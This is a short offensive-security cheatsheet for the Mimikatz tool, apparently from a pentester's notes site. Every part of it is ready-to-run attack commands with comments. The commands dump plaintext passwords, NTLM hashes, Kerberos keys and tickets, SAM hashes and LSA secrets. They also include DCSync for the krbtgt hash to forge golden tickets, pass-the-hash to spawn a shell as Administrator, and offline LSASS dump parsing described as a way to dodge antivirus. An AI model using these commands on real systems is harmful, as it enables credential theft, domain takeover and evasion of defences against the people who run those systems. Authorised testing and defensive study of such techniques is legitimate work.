---
icon: lucide/scroll-text
---

# Mimikatz

> Github: https://github.com/gentilkiwi/mimikatz

Cheatsheet:

``` text
# Start logging this session so we can refer back to it
log lsass.txt

# Enable SeDebugPrivilege — required to read LSASS memory (needs local admin)
privilege::debug

# Impersonate a SYSTEM token — required for the lsadump:: commands that read SAM/SECRETS
token::elevate

# Dump Kerberos encryption keys (AES/RC4/DES) from LSASS — use for pass-the-key / overpass-the-hash
sekurlsa::ekeys

# Extract Kerberos tickets (TGT/TGS) from all sessions in LSASS memory to .kirbi files
sekurlsa::tickets /export

# Dump cached domain logons (MSCACHEV2 / DCC2 hashes) from the registry — crack offline, no PtH
lsadump::cache

# Dump plaintext passwords + NTLM hashes + Kerberos creds for logged-on users from LSASS
sekurlsa::logonpasswords

# Dump local account NTLM hashes from the SAM hive (local accounts only)
lsadump::sam

# Dump LSA secrets from the registry — often plaintext service-account passwords, DPAPI keys
lsadump::secrets

# DCSync: pull hashes straight from a DC over the wire, no code runs on the DC.
# Grab krbtgt for a golden ticket, or a specific user. Needs DCSync rights (DA / Repl privileges).
lsadump::dcsync /domain:corp.local /user:krbtgt

# Pass-the-Hash: spawn a process as another user with just their NTLM hash — lateral movement
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash> /run:cmd.exe

# Offline analysis: parse an LSASS dump grabbed elsewhere (e.g. procdump/comsvcs) to dodge AV.
# Run this first, then sekurlsa::logonpasswords / ekeys work against the dump instead of live memory.
sekurlsa::minidump lsass.dmp
```
